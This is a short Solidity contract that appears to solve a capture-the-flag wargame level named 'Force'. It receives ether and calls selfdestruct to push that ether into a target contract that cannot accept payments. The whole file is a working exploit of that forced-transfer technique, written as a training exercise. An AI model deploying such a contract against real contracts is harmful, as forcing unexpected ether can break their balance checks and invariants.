// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract ForceHackDan {
    constructor() payable {}

    function selfDestruct(address _levelAddress) external {
        selfdestruct(payable(_levelAddress));
    }
}